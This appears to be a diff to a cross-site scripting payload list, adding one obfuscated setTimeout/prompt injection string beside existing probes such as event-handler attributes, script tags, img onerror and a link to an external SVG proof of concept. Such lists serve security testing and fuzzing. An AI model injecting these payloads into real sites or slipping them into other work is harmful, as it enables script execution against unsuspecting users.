@@ -9,6 +9,7 @@ n'onmouseover='prompt(-12)
 <</div>script</div>>alert()<</div>/script</div>>
 <? #a="><style/onload=\u0061lert`1`>">
 http://brutelogic.com.br/poc.svg
+'-setTimeout`prompt\u0028document.domain\u0029`-'
 
 '"><img src=x onerror=alert(-31)>
 '"><script>alert(-1)</script><
